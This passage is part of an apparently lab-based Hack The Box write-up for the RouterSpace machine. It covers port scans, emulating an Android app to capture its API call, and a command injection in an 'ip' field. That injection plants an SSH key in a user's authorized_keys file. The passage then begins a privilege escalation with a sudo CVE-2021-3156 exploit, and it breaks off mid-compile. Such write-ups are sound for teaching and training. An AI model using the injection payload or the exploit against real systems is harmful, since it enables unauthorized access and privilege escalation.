background-color: null;
font-style: inherit;">""</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-51"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>meta <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">name</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"viewport"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">content</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"width=device-width, initial-scale=1"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-52"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>link <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">rel</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"stylesheet"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">href</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"css/bootstrap.min.css"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-53"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>link <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">rel</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"stylesheet"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">href</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"css/owl.carousel.min.css"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-54"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>link <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">rel</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"stylesheet"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">href</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"css/magnific-popup.css"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-55"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>link <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">rel</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"stylesheet"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">href</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"css/font-awesome.min.css"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-56"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>link <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">rel</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"stylesheet"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">href</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"css/themify-icons.css"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-57"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HTTPOptions:</span> </span>
<span id="cb1-58"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HTTP/1.1</span> 200 OK</span>
<span id="cb1-59"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">X-Powered-By:</span> RouterSpace</span>
<span id="cb1-60"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">X-Cdn:</span> RouterSpace-79870</span>
<span id="cb1-61"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Allow:</span> GET,HEAD,POST</span>
<span id="cb1-62"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Type:</span> text/html<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">charset</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>utf-8</span>
<span id="cb1-63"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Length:</span> 13</span>
<span id="cb1-64"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ETag:</span> W/<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"</span></span>
<span id="cb1-65"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Date:</span> Mon, 28 Mar 2022 07:24:54 GMT</span>
<span id="cb1-66"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Connection:</span> close</span>
<span id="cb1-67"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">GET,HEAD,POST</span></span>
<span id="cb1-68"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RTSPRequest,</span> X11Probe: </span>
<span id="cb1-69"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HTTP/1.1</span> 400 Bad Request</span>
<span id="cb1-70"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>    Connection: close</span>
<span id="cb1-71"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> RouterSpace</span>
<span id="cb1-72"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-trane-info:</span> Problem with XML parsing of /evox/about</span>
<span id="cb1-73"></span>
<span id="cb1-74"></span>
<span id="cb1-75"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[root:/git/htb/pandora]#</span> nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sU</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--top-port</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>20 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--open</span> 10.10.11.136</span>
<span id="cb1-76"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>     STATE         SERVICE</span>
<span id="cb1-77"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">67/udp</span>   open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> dhcps</span>
<span id="cb1-78"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">68/udp</span>   open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> dhcpc</span>
<span id="cb1-79"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">135/udp</span>  open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> msrpc</span>
<span id="cb1-80"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">137/udp</span>  open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> netbios-ns</span>
<span id="cb1-81"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">138/udp</span>  open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> netbios-dgm</span>
<span id="cb1-82"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">161/udp</span>  open          snmp</span>
<span id="cb1-83"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">520/udp</span>  open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> route</span>
<span id="cb1-84"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">4500/udp</span> open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> nat-t-ike</span></code></pre></div>
<p><strong>dirb:</strong></p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N/A</span></span></code></pre></div>
<p><strong>nikto:</strong></p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> Uncommon header <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'x-cdn'</span> found, with contents: RouterSpace-66427</span></code></pre></div>
<p><strong>ffuf:</strong></p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://10.10.11.148/FUZZ <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-fs</span> 50-95</span>
<span id="cb4-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">css</span>                     [Status: 301, Size: 173, Words: 7, Lines: 11]</span>
<span id="cb4-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fonts</span>                   [Status: 301, Size: 177, Words: 7, Lines: 11]</span>
<span id="cb4-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">img</span>                     [Status: 301, Size: 173, Words: 7, Lines: 11]</span>
<span id="cb4-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">js</span>                      [Status: 301, Size: 171, Words: 7, Lines: 11]</span>
<span id="cb4-6"></span>
<span id="cb4-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://10.10.11.148/FUZZ.html <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-fs</span> 50-95</span>
<span id="cb4-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">contact</span>                 [Status: 200, Size: 46439, Words: 10270, Lines: 358]</span></code></pre></div>
<hr>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>Visit the website and we find multiple download buttons, all leading to <code>RouterSpace.apk</code>. Before we analyze the binary, we look on <code>contact.html</code>, while there we find <code>features.html</code> and <code>Pricing.html</code>, both gives some strange output.</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span> http://10.10.11.148/features.html</span>
<span id="cb5-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> GET <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/features.html</span> HTTP/1.1</span>
<span id="cb5-3"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Host: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.148</span></span>
<span id="cb5-4"></span>
<span id="cb5-5"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> HTTP/1.1 <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">200</span> OK</span>
<span id="cb5-6"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> X-Powered-By: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RouterSpace</span></span>
<span id="cb5-7"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> X-Cdn: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RouterSpace-65007</span></span>
<span id="cb5-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> </span>
<span id="cb5-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Suspicious</span> activity detected !!! {RequestID: Z   73Mv z    F F i }</span>
<span id="cb5-10"></span>
<span id="cb5-11">                                                                                                           </span>
<span id="cb5-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">┌──</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">void㉿void</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-[/htb/routerspace]</span></span>
<span id="cb5-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">└─$</span> curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span> http://10.10.11.148/Pricing.html </span>
<span id="cb5-14"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> GET <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/Pricing.html</span> HTTP/1.1</span>
<span id="cb5-15"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Host: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.148</span></span>
<span id="cb5-16"></span>
<span id="cb5-17"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> HTTP/1.1 <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">200</span> OK</span>
<span id="cb5-18"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> X-Powered-By: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RouterSpace</span></span>
<span id="cb5-19"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> X-Cdn: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RouterSpace-85902</span></span>
<span id="cb5-20"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> </span>
<span id="cb5-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Suspicious</span> activity detected !!! {RequestID: l2  Pmi   K lhy9 vL C yj6a  }</span></code></pre></div>
<p>Unzip the .apk-file and start analyzing the data.. .. we find host name in <code>apk-unpack/META-INF/CERT.RSA</code> - <code>routerspace.htb</code></p>
<p>Nothing more of value at first glance. As this is a easy box we should probably look for something obvious, like a public key for the SSH service, some API call or similar. Analyzing the data further with <code>jd-gui</code> and <code>MobSF</code> doesn’t give anything of value either.</p>
<p>Change approach and try to emulate the apk using <code>Anbox</code> and <code>adb</code>:</p>
<pre><code>Install (if "ls -1 /dev/{ashmem,binder}" gives not found):
$ apt install dkms linux-headers-amd64
$ git clone https://github.com/anbox/anbox-modules.git
$ sudo ./INSTALL.sh
$ sudo modprobe ashmem_linux &amp;&amp; sudo modprobe binder_linux
$ ls -1 /dev/{ashmem,binder}

$ sudo apt install snapd
$ service snapd start
$ sudo snap install --devmode --beta anbox

$ sudo apt install android-tools-adb
$ adb devices
 * daemon not running; starting now at tcp:5037
 * daemon started successfully
 List of devices attached
$ anbox launch --package=org.anbox.appmgr
$ adb devices                            
 List of devices attached
 emulator-5558  device
$ adb install RouterSpace.apk            
 Performing Streamed Install
 Success
$ anbox.appmgr 


If not able to enable proxy, kill all adb and anbox servies and try again.
$ kill ...
$ adb devices
$ adb shell settings put global http_proxy 192.168.101.187:8181
$ anbox.appmgr</code></pre>
<p><strong>Burp Proxy Settings</strong>: <img src="https://exploit.se/posts/2022-03-28-htb-writeup-routerspace/images/routerspace01.png" class="img-fluid"></p>
<p>We are now able to capture the <code>Check Status</code> API call in Burp. <img src="https://exploit.se/posts/2022-03-28-htb-writeup-routerspace/images/routerspace02.png" class="img-fluid"></p>
<hr>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>We have one data parameter to play with, <code>ip</code>, and we quickly find that it’s not sanitized and vulnerable for command injection.</p>
<p><img src="https://exploit.se/posts/2022-03-28-htb-writeup-routerspace/images/routerspace03.png" class="img-fluid"></p>
<p>Generate a new SSH key, inject it and login as user Paul. Grab user.txt.</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">┌──</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">void㉿void</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-[/htb/routerspace]</span></span>
<span id="cb7-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">└─$</span> ssh-keygen <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-t</span> rsa <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-b</span> 4096 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> paul-id_rsa</span>
<span id="cb7-3"></span>
<span id="cb7-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">┌──</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">void㉿void</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-[/htb/routerspace]</span></span>
<span id="cb7-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">└─$</span> cat paul-id_rsa.pub  </span>
<span id="cb7-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssh-rsa</span> AAAAB3NzaC1yc2EAAAADAQABAAACAQC [... snip ...]</span>
<span id="cb7-7"></span>
<span id="cb7-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Inject</span> the payload in Burp Repeater: </span>
<span id="cb7-9"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">mkdir</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> /home/paul/.ssh <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC [... snip ...]'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /home/paul/.ssh/authorized_keys</span>
<span id="cb7-10"></span>
<span id="cb7-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">┌──</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">void㉿void</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-[/htb/routerspace]</span></span>
<span id="cb7-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">└─$</span> ssh paul@routerspace.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> paul-id_rsa</span>
<span id="cb7-13"></span>
<span id="cb7-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">paul@routerspace:~$</span> id <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> user.txt </span>
<span id="cb7-15"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1001<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">paul</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1001<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">paul</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1001<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">paul</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb7-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">e8f2d33e776f9e917eeab833f5dff7a6</span></span></code></pre></div>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>With some quick manual enumeration we find that the sudo version is old and vulnerable to CVE-2021-3156.</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">paul@routerspace:~$</span> sudo <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--version</span></span>
<span id="cb8-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Sudo</span> version 1.8.31</span>
<span id="cb8-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Sudoers</span> policy plugin version 1.8.31</span>
<span id="cb8-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Sudoers</span> file grammar version 46</span>
<span id="cb8-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Sudoers</span> I/O plugin version 1.8.31</span>
<span id="cb8-6"></span>
<span id="cb8-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">paul@routerspace:~$</span> lsb_release <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-a</span></span>
<span id="cb8-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">No</span> LSB modules are available.</span>
<span id="cb8-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Distributor</span> ID: Ubuntu</span>
<span id="cb8-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">author:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"0xPThree"</span></span>
<span id="cb8-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">description:</span>    Ubuntu 20.04.3 LTS</span>
<span id="cb8-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Release:</span>    20.04</span>
<span id="cb8-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Codename:</span>   focal</span>
<span id="cb8-14"></span>
<span id="cb8-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">┌──</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">void㉿void</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-[/htb/routerspace]</span></span>
<span id="cb8-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">└─$</span> scp <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> paul-id_rsa <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-rp</span> sudo-exploit-main paul@routerspace.htb:/dev/shm                                                                                1 ⨯</span>
<span id="cb8-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sice.c</span>                                                                                                                      100%  176     5.5KB/s   00:00    </span>
<span id="cb8-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">README.md</span>                                                                                                                   100%  234     7.6KB/s   00:00    </span>
<span id="cb8-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Makefile</span>                                                                                                                    100%   95     3.0KB/s   00:00    </span>
<span id="cb8-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">exploit.c</span>                                                                                                                   100% 2651    82.9KB/s   00:00 </span>
<span id="cb8-21"></span>
<span id="cb8-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">paul@routerspace:/dev/shm/sudo-exploit-main$</span> make</span>
<span id="cb8-23"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">gcc</span> exploit.c <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-o</span> exploit</span>
<span id="cb8-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">exploit.c:</span> In function ‘main’:</span>
<span id="cb8-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">exploit.c:75:5:</span> warning: implicit declaration of function ‘execve’ <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[-</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">Wimplicit</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">-</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">function</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">-</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">declaration</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span></span>
<span id="cb8-26">   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">75</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">execve</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">argv</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> argv, env<span class="kw" style="color: #003B4F;
background-color: null;
